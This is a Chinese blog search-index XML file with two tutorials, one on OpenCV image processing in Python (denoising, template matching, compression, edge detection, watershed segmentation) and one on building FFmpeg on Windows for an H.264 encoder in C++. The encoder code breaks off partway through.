<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>OpenCV在图像处理方面的应用</title>
    <url>/1003/</url>
    <content><![CDATA[<p>OpenCV是一个基于BSD许可（开源）发行的跨平台计算机视觉库，可以运行在Linux、Windows、Android和Mac OS操作系统上。它轻量级而且高效——由一系列 C 函数和少量 C++ 类构成，同时提供了Python、Ruby、MATLAB等语言的接口，实现了图像处理和计算机视觉方面的很多通用算法。</p>
<p>本文将使用python3.6，通过调用OpenCV库来实现图像处理几个方面的功能。</p>
<span id="more"></span>

<h1 id="前期工作"><a href="#前期工作" class="headerlink" title="前期工作"></a>前期工作</h1><h2 id="python3安装"><a href="#python3安装" class="headerlink" title="python3安装"></a>python3安装</h2><p>浏览官方网站（ <a href="https://www.python.org/downloads/">https://www.python.org/downloads/</a> ）选择合适版本下载。</p>
<p><img src="/1003/1.png"></p>
<p>下载完成后运行安装即可。</p>
<h2 id="OpenCV安装"><a href="#OpenCV安装" class="headerlink" title="OpenCV安装"></a>OpenCV安装</h2><ol>
<li>浏览python扩展库站（ <a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/">https://www.lfd.uci.edu/~gohlke/pythonlibs/</a> ）选择合适版本。</li>
</ol>
<p><img src="/1003/2.png"></p>
<ol start="2">
<li>使用__cmd__进入下载好的文件的目录，使用__pip__指令安装：</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install opencv_python‑<span class="number">3.4</span><span class="number">.0</span>‑cp36‑cp36m‑win_amd64.whl</span><br></pre></td></tr></table></figure>

<p>在__cmd__中进入python并加载opencv模块验证是否安装成功：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="built_in">print</span>(cv2.__version__)</span><br></pre></td></tr></table></figure>

<p>如下图屏幕输出版本号即说明安装成功。</p>
<p><img src="/1003/3.png"></p>
<h1 id="原理与实现"><a href="#原理与实现" class="headerlink" title="原理与实现"></a>原理与实现</h1><h2 id="图像去噪"><a href="#图像去噪" class="headerlink" title="图像去噪"></a>图像去噪</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>图像去噪主要是由图像平滑（图像模糊）算法来实现的。图像平滑要使用滤波器，图像的滤波可以看成是滤波模板与原始图像对应部分的的卷积运算。</p>
<p>在图像处理中，常见的滤波器包括：</p>
<ol>
<li>归一化滤波器（Homogeneous blur）</li>
</ol>
<p>  也是均值滤波器，用输出像素点核窗口内的像素均值代替输出点像素值。</p>
<ol start="2">
<li>高斯滤波器（Guassian blur）</li>
</ol>
<p>  是实际中最常用的滤波器，高斯滤波是将输入数组的每一个像素点与高斯内核卷积将卷积和当作输出像素值。高斯核相当于对输出像素的邻域赋予不同的权值，输出像素点所在位置的权值最大（对应高斯函数的均值位置）。</p>
<ol start="3">
<li>中值滤波器（median blur）</li>
</ol>
<p>  中值滤波将图像的每个像素用邻域(以当前像素为中心的正方形区域)像素的中值代替。对椒盐噪声最有效的滤波器，去除跳变点非常有效。</p>
<ol start="4">
<li>双边滤波器（Bilatrial blur）</li>
</ol>
<p>  为避免滤波器平滑图像去噪的同时使边缘也模糊，这种情况下使用双边滤波器。</p>
<p>这里选择高斯滤波器来实现图像去噪，其它使用方法大致相同。</p>
<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>定义图像匹配子函数，提供标准接口，源码及注释如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">img_filt</span>(<span class="params">InputFile,OutputFile,OutputFile2</span>): </span><br><span class="line">       <span class="comment">#接口参数：(输入原图片，输出加噪声图片，输出已去噪图片)</span></span><br><span class="line">    img = cv2.imread(InputFile,<span class="number">0</span>) <span class="comment">#直接读为灰度图像</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>): <span class="comment">#添加2000个点噪声</span></span><br><span class="line">        temp_x = np.random.randint(<span class="number">0</span>,img.shape[<span class="number">0</span>]) <span class="comment">#x方向随机坐标</span></span><br><span class="line">        temp_y = np.random.randint(<span class="number">0</span>,img.shape[<span class="number">1</span>]) <span class="comment">#y方向随机坐标</span></span><br><span class="line">        img[temp_x][temp_y] = <span class="number">255</span> <span class="comment">#随机点噪声</span></span><br><span class="line">    blur = cv2.GaussianBlur(img,(<span class="number">5</span>,<span class="number">5</span>),<span class="number">0</span>) <span class="comment">#高斯滤波</span></span><br><span class="line">    cv2.imwrite(OutputFile,img) <span class="comment">#输出加噪声图片</span></span><br><span class="line">    cv2.imwrite(OutputFile2,blur) <span class="comment">#输出已去噪图片</span></span><br></pre></td></tr></table></figure>

<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>加噪图及滤波图如下所示：</p>
<p><img src="/1003/4.png"></p>
<p><img src="/1003/5.png"></p>
<h2 id="图像匹配"><a href="#图像匹配" class="headerlink" title="图像匹配"></a>图像匹配</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>模板匹配是在图像中寻找和识别模板的一种简单的方法。</p>
<p>通过调用cv2库及numpy库函数，加载原始图像和要搜索的图像模板。OpenCV对原始图像进行处理，创建一个灰度版本，在灰度图像里进行处理和查找匹配。然后使用相同的坐标在原始图像中进行还原并输出。</p>
<h3 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h3><p>定义图像匹配子函数，提供标准接口，源码及注释如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">img_match</span>(<span class="params">InputFile,InputFile2,OutputFile</span>): </span><br><span class="line">       <span class="comment">#接口参数：(输入原图片，待匹配模板，输出已匹配图片)</span></span><br><span class="line">    img_rgb = cv2.imread(InputFile) <span class="comment">#读原图</span></span><br><span class="line">    img_gray = cv2.cvtColor(img_rgb, cv2.COLOR_BGR2GRAY) <span class="comment">#灰度化处理</span></span><br><span class="line">    template = cv2.imread(InputFile2,<span class="number">0</span>) <span class="comment">#读模板</span></span><br><span class="line">    w, h = template.shape[::-<span class="number">1</span>] <span class="comment">#读模板高度宽度</span></span><br><span class="line">    res = cv2.matchTemplate(img_gray,template,cv2.TM_CCOEFF_NORMED) <span class="comment">#匹配</span></span><br><span class="line">    threshold = <span class="number">0.7</span> <span class="comment">#设定匹配阈值</span></span><br><span class="line">    loc = np.where( res &gt;= threshold) <span class="comment">#找标记位置</span></span><br><span class="line">    color = (<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>)       <span class="comment"># 设定标记框颜色</span></span><br><span class="line">    strokeWeight = <span class="number">1</span>        <span class="comment"># 设定标记框粗细</span></span><br><span class="line">    <span class="keyword">for</span> pt <span class="keyword">in</span> <span class="built_in">zip</span>(*loc[::-<span class="number">1</span>]):</span><br><span class="line">        cv2.rectangle(img_rgb, pt, (pt[<span class="number">0</span>] + w, pt[<span class="number">1</span>] + h), color, strokeWeight)   <span class="comment">#在原图中标记</span></span><br><span class="line">    cv2.imwrite(OutputFile, img_rgb) <span class="comment">#输出已匹配图片</span></span><br></pre></td></tr></table></figure>

<h3 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h3><p>原图、模板图及匹配图如下所示：</p>
<p><img src="/1003/6.png"></p>
<p><img src="/1003/7.png"></p>
<p><img src="/1003/8.png"></p>
<h2 id="图像压缩"><a href="#图像压缩" class="headerlink" title="图像压缩"></a>图像压缩</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>Opencv中直接用cv2.imwrite()即可保存图像。其中，imwrite()有个可选的第三个参数。</p>
<p>对于JPEG，第三个参数__cv2.IMWRITE_JPEG_QUALITY__表示的是图像的质量，用0-100的整数表示，默认为95。 </p>
<p>对于PNG，第三个参数__cv2.IMWRITE_PNG_COMPRESSION__表示的是压缩级别。从0到9，压缩级别越高，图像尺寸越小。默认级别为3。</p>
<p>需注意的是，第三个参数类型为Long，必须转换成int。</p>
<p>可以通过调整这个可选参数来实现图像的压缩。</p>
<h3 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h3><p>定义图像匹配子函数，提供标准接口，源码及注释如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">img_zip</span>(<span class="params">InputFile, OutputFile</span>): </span><br><span class="line">    <span class="comment">#接口参数：(输入原图片(jpg版)，输出已压缩图片)</span></span><br><span class="line">    image = cv2.imread(InputFile) <span class="comment">#读原图</span></span><br><span class="line">    rows, cols, channels = image.shape <span class="comment">#读原图尺寸</span></span><br><span class="line">    res = cv2.resize(image, (cols, rows), interpolation=cv2.INTER_AREA)</span><br><span class="line">    <span class="comment">#使用象素关系重采样。当图像缩小时候，该方法可以避免波纹出现</span></span><br><span class="line">    cv2.imwrite(OutputFile, res,  [<span class="built_in">int</span>(cv2.IMWRITE_JPEG_QUALITY), <span class="number">50</span>])</span><br><span class="line">    <span class="comment">#输出已压缩图片，调整质量参数为50</span></span><br></pre></td></tr></table></figure>

<h3 id="结果-2"><a href="#结果-2" class="headerlink" title="结果"></a>结果</h3><p>原图、压缩图及文件大小属性图如下所示：</p>
<p><img src="/1003/6.png"></p>
<p><img src="/1003/9.png"></p>
<p><img src="/1003/10.png"></p>
<h2 id="边缘检测"><a href="#边缘检测" class="headerlink" title="边缘检测"></a>边缘检测</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>边缘检测一般由以下三个步骤组成：</p>
<ol>
<li><p>滤波：边缘检测的算法主要是基于图像强度的一阶和二阶导数，但导数通常对噪声很敏感，因此必须采用滤波器来改善与噪声有关的边缘检测器的性能。常见的滤波方法主要有高斯滤波等(见3.1)。</p>
</li>
<li><p>增强：增强边缘的基础是确定图像各点邻域强度的变化值。增强算法可以将图像灰度点邻域强度值有显著变化的点凸显出来。在具体编程实现时，可通过计算梯度幅值来确定。</p>
</li>
<li><p>检测：经过增强的图像，往往邻域中有很多点的梯度值比较大，而在特定的应用中，这些点并不是我们要找的边缘点，所以应该采用某种方法来对这些点进行取舍。实际工程中，常用的方法是通过阈值化方法来检测。</p>
</li>
</ol>
<p>Opencv中提供了几种不同的算子来实现边缘检测算法，这里选择了效果最佳的Canny算子来实现图像分割。</p>
<p>Canny 边缘检测的步骤主要有以下几步：</p>
<ol>
<li>消除噪声。 一般情况下，使用高斯平滑滤波器卷积降噪。</li>
<li>计算梯度幅值和方向。 此处，一般按照Sobel滤波器的步骤。</li>
<li>非极大值抑制。 这一步排除非边缘像素， 仅仅保留了一些细线条(候选边缘)。</li>
<li>滞后阈值。最后一步，Canny 使用了滞后阈值，滞后阈值需要两个阈值(高阈值作为边缘，低阈值排除，中间阈值连接边缘)。</li>
</ol>
<h3 id="实现-3"><a href="#实现-3" class="headerlink" title="实现"></a>实现</h3><p>定义边缘检测子函数，提供标准接口，源码及注释如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">img_edgedetection</span>(<span class="params">InputFile, OutputFile</span>):</span><br><span class="line">           <span class="comment">#接口参数：(输入原图片，输出边缘图片)</span></span><br><span class="line">    image = cv2.imread(InputFile) <span class="comment">#读原图</span></span><br><span class="line">    gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY) <span class="comment">#灰度化</span></span><br><span class="line">    canny = cv2.Canny(gray, <span class="number">30</span>, <span class="number">150</span>) <span class="comment">#30和150分别是高低阈值</span></span><br><span class="line">    cv2.imwrite(OutputFile,canny) <span class="comment">#输出边缘图片</span></span><br></pre></td></tr></table></figure>

<h3 id="结果-3"><a href="#结果-3" class="headerlink" title="结果"></a>结果</h3><p>原图及边缘检测图如下所示：</p>
<p><img src="/1003/6.png"></p>
<p><img src="/1003/11.png"></p>
<h2 id="图像分割"><a href="#图像分割" class="headerlink" title="图像分割"></a>图像分割</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>OpenCV中提供了分水岭算法来实现图像的分割。</p>
<p>分水岭算法的原理就是任意的灰度图像可以被看做是地质学表面，高亮度的地方是山峰，低亮度的地方是山谷。给每个孤立的山谷（局部最小值）不同颜色的水（标签），当水涨起来，根据周围的山峰（梯度），不同的山谷也就是不同的颜色会开始合并，要避免这个，可以在水要合并的地方建立障碍，直到所有山峰都被淹没。而这些创建的障碍就是分割结果。</p>
<p>利用OpenCV中的相关函数，我们对图片进行二值化处理，并使用形态学开运算去掉小的白色噪点，用形态学闭运算去除小的洞，腐蚀法去掉边缘的像素，对结果进行膨胀，把目标边缘扩展到背景，剩下的区域利用分水岭算法，以实现图像分割。</p>
<h3 id="实现-4"><a href="#实现-4" class="headerlink" title="实现"></a>实现</h3><p>定义图像分割子函数，提供标准接口，源码及注释如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">img_segmentation</span>(<span class="params">InputFile, OutputFile</span>):</span><br><span class="line">           <span class="comment">#接口参数：(输入原图片，输出边缘图片)</span></span><br><span class="line">    img = cv2.imread(InputFile) <span class="comment">#读原图</span></span><br><span class="line">    gray = cv2.cvtColor(img,cv2.COLOR_BGR2GRAY) <span class="comment">#灰度化</span></span><br><span class="line">    ret, thresh = cv2.threshold(gray,<span class="number">0</span>,<span class="number">255</span>,cv2.THRESH_BINARY_INV+cv2.THRESH_OTSU) <span class="comment">#二值化</span></span><br><span class="line">    </span><br><span class="line">    kernel = np.ones((<span class="number">3</span>,<span class="number">3</span>),np.uint8)</span><br><span class="line">    opening = cv2.morphologyEx(thresh,cv2.MORPH_OPEN,kernel, iterations = <span class="number">2</span>) <span class="comment">#去噪</span></span><br><span class="line">    </span><br><span class="line">    sure_bg = cv2.dilate(opening,kernel,iterations=<span class="number">3</span>) <span class="comment">#背景区域</span></span><br><span class="line"></span><br><span class="line">    dist_transform = cv2.distanceTransform(opening,cv2.DIST_L2,<span class="number">5</span>)</span><br><span class="line">    ret, sure_fg = cv2.threshold(dist_transform,<span class="number">0.7</span>*dist_transform.<span class="built_in">max</span>(),<span class="number">255</span>,<span class="number">0</span>) <span class="comment">#找前景区域</span></span><br><span class="line"></span><br><span class="line">    sure_fg = np.uint8(sure_fg)</span><br><span class="line">    unknown = cv2.subtract(sure_bg,sure_fg) <span class="comment">#找未知区域</span></span><br><span class="line"></span><br><span class="line">    ret, markers = cv2.connectedComponents(sure_fg) <span class="comment">#标记</span></span><br><span class="line"></span><br><span class="line">    markers = markers+<span class="number">1</span> <span class="comment">#保证确定的背景区不是0是1</span></span><br><span class="line"></span><br><span class="line">    markers[unknown==<span class="number">255</span>]=<span class="number">0</span> <span class="comment">#未知区域标0</span></span><br><span class="line"></span><br><span class="line">    markers = cv2.watershed(img,markers)</span><br><span class="line">    img[markers == -<span class="number">1</span>] = [<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>] <span class="comment">#分割框颜色</span></span><br><span class="line"></span><br><span class="line">    cv2.imwrite(OutputFile, img) <span class="comment">#输出已分割图片</span></span><br></pre></td></tr></table></figure>

<h3 id="结果-4"><a href="#结果-4" class="headerlink" title="结果"></a>结果</h3><p>图片分割部分选择边缘较明显图片，原图及分割图如下所示：</p>
<p><img src="/1003/12.png"></p>
<p><img src="/1003/13.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>OpenCV在图像处理方面功能强大，还有许多技术有待学习。</p>
<p>本文中所有的源码及测试图片均已上传至我的github项目页中，如有需要请访问<a href="https://github.com/gaoteng17/ImageProcessing">https://github.com/gaoteng17/ImageProcessing</a> 。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a><em>参考资料</em></h1><ol>
<li>OpenCV - Wikipedia. <a href="https://en.wikipedia.org/wiki/OpenCV">https://en.wikipedia.org/wiki/OpenCV</a></li>
<li>OpenCV - API Reference. <a href="https://docs.opencv.org/2.4/index.html">https://docs.opencv.org/2.4/index.html</a></li>
<li>QianMo - github. <a href="https://github.com/QianMo/OpenCV3-Intro-Book-Src">https://github.com/QianMo/OpenCV3-Intro-Book-Src</a></li>
<li>jungrea - github. <a href="https://github.com/jungrea">https://github.com/jungrea</a></li>
<li>xxxss - jianshu. <a href="https://www.jianshu.com/u/c01fd7356e58">https://www.jianshu.com/u/c01fd7356e58</a></li>
</ol>
]]></content>
      <tags>
        <tag>opencv</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>h264编码器实现</title>
    <url>/1002/</url>
    <content><![CDATA[<p>FFmpeg是一个开源的多媒体库，使用非常广泛。FFmpeg在Linux平台下开发，但它同样也可以在其它操作系统环境中编译运行。</p>
<p>本文使用FFmpeg + MinGW(MSYS)  + Yasm + VS2017 的技术路线来完成FFmpeg在Windows 10(64bit)下的编译，并参考相关学习文档，使用c++语言编写一个简单的编码程序，通过调用FFmpeg库中开源.h及.dll文件，实现yuv格式视频文件的h.264编码。</p>
<span id="more"></span>

<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h2><h3 id="FFmpeg"><a href="#FFmpeg" class="headerlink" title="FFmpeg"></a>FFmpeg</h3><p>FFmpeg是一套可以用来记录、转换数字音频、视频，并能将其转化为流的开源计算机程序。</p>
<p>FFmpeg库主要由以下几个部分组成：</p>
<ul>
<li>libavformat：用于各种音视频封装格式的生成和解析，包括获取解码所需信息以生成解码上下文结构和读取音视频帧等功能；</li>
<li>__libavcodec__：用于各种类型声音&#x2F;图像编解码；</li>
<li>libavutil：包含一些公共的工具函数；</li>
<li>libswscale：用于视频场景比例缩放、色彩映射转换；</li>
<li>libpostproc：用于后期效果处理；</li>
<li>_ffmpeg_：该项目提供的一个工具，可用于格式转换、解码或电视卡即时编码等；</li>
<li>_ffsever_：一个 HTTP 多媒体即时广播串流服务器；</li>
<li>_ffplay_：是一个简单的播放器，使用ffmpeg 库解析和解码，通过SDL显示；</li>
</ul>
<p>本文主要使用了libavcodec库中相关源码实现h.264视频编码。</p>
<h3 id="MinGW"><a href="#MinGW" class="headerlink" title="MinGW"></a>MinGW</h3><p>MinGW，是Minimalist GNUfor Windows的缩写。它是一个可自由使用和自由发布的Windows特定头文件和使用GNU工具集导入库的集合，允许用户在GNU&#x2F;Linux和Windows平台生成本地的Windows程序而不需要第三方C运行时（C Runtime）库。</p>
<p>MSYS，即Minimal GNU（POSIX）system on Windows，是一个小型的GNU环境，包括基本的bash，make等等。是Windows下最优秀的GNU环境。</p>
<p>本文主要利用了MingW中的MSYS模块来完成FFmpeg的编译。</p>
<h3 id="Yasm"><a href="#Yasm" class="headerlink" title="Yasm"></a>Yasm</h3><p>Yasm是一款汇编语言编译程序，是一个完全重写的NASM汇编，具有编译器程序跨平台和模块化的特性。目前，它支持x86和AMD64指令集。</p>
<p>本文使用Yasm以达到在x86&#x2F;x64平台下汇编代码加速的作用，来给予FFmpeg支持。</p>
<h3 id="VS2017"><a href="#VS2017" class="headerlink" title="VS2017"></a>VS2017</h3><p>Microsoft Visual Studio（简称VS）是美国微软公司的开发工具包系列产品。VS是一个基本完整的开发工具集，它包括了整个软件生命周期中所需要的大部分工具，目前最新版本为 Visual Studio 2017。</p>
<p>本文使用VS的开发环境，主要利用它的 lib.exe 生成 *.lib 文件。</p>
<h2 id="H-264"><a href="#H-264" class="headerlink" title="H.264"></a>H.264</h2><p>H.264，是由ITU-T视频编码专家组（VCEG）和ISO&#x2F;IEC动态图像专家组（MPEG）联合组成的联合视频组（JVT，Joint Video Team）提出的高度压缩数字视频编解码器标准。</p>
<p>H.264主要有以下几点优势：</p>
<ol>
<li>低码率（Low Bit Rate）：和MPEG2和MPEG4 ASP等压缩技术相比，在同等图像质量下，采用H.264技术压缩后的数据量只有MPEG2的1&#x2F;8，MPEG4的1&#x2F;3。</li>
<li>高质量的图像：H.264能提供连续、流畅的高质量图像（DVD质量）。</li>
<li>容错能力强：H.264提供了解决在不稳定网络环境下容易发生的丢包等错误的必要工具。</li>
<li>网络适应性强：H.264提供了网络抽象层（Network Abstraction Layer），使得H.264的文件能容易地在不同网络上传输（例如互联网，CDMA，GPRS，WCDMA，CDMA2000等）。</li>
</ol>
<p>本文主要实现了视频的h.264编码，并对编码后的h.264文件进行码流解析。</p>
<h2 id="编码流程"><a href="#编码流程" class="headerlink" title="编码流程"></a>编码流程</h2><p>使用FFmpeg编码视频的流程大致如下图所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">st=&gt;start: begin</span><br><span class="line">e=&gt;end: close</span><br><span class="line">con=&gt;condition: Read Raw Data?</span><br><span class="line">op1=&gt;operation: av_register_all()</span><br><span class="line">op2=&gt;operation: avformat_alloc_output_context2()</span><br><span class="line">op3=&gt;operation: avio_open()</span><br><span class="line">op4=&gt;operation: av_new_stream()</span><br><span class="line">op5=&gt;operation: avcodec_open2()</span><br><span class="line">op6=&gt;operation: avformat_write_header()</span><br><span class="line">op7=&gt;operation: flush_encoder()</span><br><span class="line">op8=&gt;operation: av_write_trailer()</span><br><span class="line">op9=&gt;operation: av_write_frame()</span><br><span class="line">op10=&gt;operation: avcodec_encode_video2()</span><br><span class="line"></span><br><span class="line">st-&gt;op1-&gt;op2-&gt;op3-&gt;op4-&gt;op5-&gt;op6-&gt;con(no)-&gt;op7-&gt;op8-&gt;e</span><br><span class="line">con(yes,right)-&gt;op10-&gt;op9(right)-&gt;con</span><br></pre></td></tr></table></figure>

<p>其中各个函数的作用如下：</p>
<ul>
<li>av_register_all()：注册FFmpeg所有编解码器。</li>
<li>avformat_alloc_output_context2()：初始化输出码流的AVFormatContext。</li>
<li>avio_open()：打开输出文件。</li>
<li>av_new_stream()：创建输出码流的AVStream。</li>
<li>avcodec_find_encoder()：查找编码器。</li>
<li>avcodec_open2()：打开编码器。</li>
<li>avformat_write_header()：写文件头。</li>
<li>__avcodec_encode_video2()__：编码一帧视频。即将AVFrame（存储YUV像素数据）编码为AVPacket（存储H.264等格式的码流数据）。</li>
<li>av_write_frame()：将编码后的视频码流写入文件。</li>
<li>flush_encoder()：用于输出编码器中剩余的AVPacket。</li>
<li>av_write_trailer()：写文件尾。</li>
</ul>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h2 id="程序安装及环境配置"><a href="#程序安装及环境配置" class="headerlink" title="程序安装及环境配置"></a>程序安装及环境配置</h2><p>前期工作大致为以下几步：</p>
<ol>
<li>下载yasm，地址：<a href="http://yasm.tortall.net/Download.html">http://yasm.tortall.net/Download.html</a> 。改名为yasm.exe放到___C:\MinGW\msys\1.0\bin___文件夹下。</li>
<li>下载MinGW，并选择安装相应的项，即MSYS Basic System 。</li>
<li>安装Visual Studio 2017，使用默认路径。</li>
<li>打开___C:\MinGW\msys\1.0\msys.bat___文件，在文件头部加上：<code>call “C:\Program Files (x86)\Microsoft Visual Studio\2017\Community\VC\Auxiliary\Build\vcvars32.bat” </code>即设置开发环境，从而使用它的 lib.exe 生成 *.lib 文件。 </li>
<li>运行__msys.bat__, 程序根据我当前的用户名，在目录___C:\MinGW\msys\1.0\home___下建一个工作目录即___C:\MinGW\msys\1.0\home\gaoteng17___。</li>
<li>访问FFmpeg的Github页面，将代码打包下载并解压至我的MinGW工作目录下。</li>
<li>运行__msys.bat__,输入<code>cd FFmpeg</code>，进入FFmpeg目录；输入<code>./configure ./configure --disable-debug --enable-static --enable-swscale --disable-avformat --disable-avfilter --enable-pthreads  --enable-runtime-cpudetect --disable-w32threads --disable-ffprobe --enable-version3 --disable-everything --enable-decoder=h264 --enable-decoder=mpeg4 --disable-ffmpeg --enable-parser=h264 --enable-parser=mpeg4video --enable-parser=mpegvideo make make install</code><br> 成功后，编译生成的文件保存在 <em><strong>C:\MinGW\msys\1.0\local\bin</strong></em>,头文件保存在 ___C:\MinGW\msys\1.0\local\include___。</li>
</ol>
<p>至此，FFmpeg已编译完毕，前期工作完成。</p>
<h2 id="编码函数"><a href="#编码函数" class="headerlink" title="编码函数"></a>编码函数</h2><p>编码部分的代码在这里给出，并在关键部分添加了简单注释：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * h.264 video encoder</span></span><br><span class="line"><span class="comment"> * based on FFmpeg</span></span><br><span class="line"><span class="comment"> * learned from https://github.com/leixiaohua1020/</span></span><br><span class="line"><span class="comment"> * It can encode YUV data to H.264 bitstream. </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __STDC_CONSTANT_MACROS</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN32</span></span><br><span class="line"><span class="comment">//Windows</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libavutil/opt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libavcodec/avcodec.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libavformat/avformat.h&quot;</span></span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="comment">//Linux...</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;libavutil/opt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;libavcodec/avcodec.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;libavformat/avformat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*调用flush_encoder()将编码器中剩余的视频帧输出*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">flush_encoder</span><span class="params">(AVFormatContext *fmt_ctx,<span class="type">unsigned</span> <span class="type">int</span> stream_index)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line">	<span class="type">int</span> got_frame;</span><br><span class="line">	AVPacket enc_pkt;</span><br><span class="line">	<span class="keyword">if</span> (!(fmt_ctx-&gt;streams[stream_index]-&gt;codec-&gt;codec-&gt;capabilities &amp;</span><br><span class="line">		CODEC_CAP_DELAY))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		enc_pkt.data = <span class="literal">NULL</span>;</span><br><span class="line">		enc_pkt.size = <span class="number">0</span>;</span><br><span class="line">		<span class="built_in">av_init_packet</span>(&amp;enc_pkt);</span><br><span class="line">		ret = <span class="built_in">avcodec_encode_video2</span> (fmt_ctx-&gt;streams[stream_index]-&gt;codec, &amp;enc_pkt,</span><br><span class="line">			<span class="literal">NULL</span>, &amp;got_frame);</span><br><span class="line">		<span class="built_in">av_frame_free</span>(<span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (!got_frame)&#123;</span><br><span class="line">			ret=<span class="number">0</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Flush Encoder: 成功编码！ 当前帧：\t大小:%5d\n&quot;</span>,enc_pkt.size);</span><br><span class="line">		ret = <span class="built_in">av_write_frame</span>(fmt_ctx, &amp;enc_pkt);</span><br><span class="line">		<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	AVFormatContext* pFormatCtx;</span><br><span class="line">	AVOutputFormat* fmt;</span><br><span class="line">	AVStream* video_st;</span><br><span class="line">	AVCodecContext* pCodecCtx;</span><br><span class="line">	AVCodec* pCodec;</span><br><span class="line">	AVPacket pkt;</span><br><span class="line">	<span class="type">uint8_t</span>* picture_buf;</span><br><span class="line">	AVFrame* pFrame;</span><br><span class="line">	<span class="type">int</span> picture_size;</span><br><span class="line">	<span class="type">int</span> y_size;</span><br><span class="line">	<span class="type">int</span> framecnt=<span class="number">0</span>;</span><br><span class="line">	FILE *in_file = <span class="built_in">fopen</span>(<span class="string">&quot;../ds_480x272.yuv&quot;</span>, <span class="string">&quot;rb&quot;</span>);   <span class="comment">//YUV文件路径</span></span><br><span class="line">	<span class="type">int</span> in_w=<span class="number">480</span>,in_h=<span class="number">272</span>;                              <span class="comment">//定义输入文件宽度与高度</span></span><br><span class="line">	<span class="type">int</span> framenum=<span class="number">100</span>;                                   <span 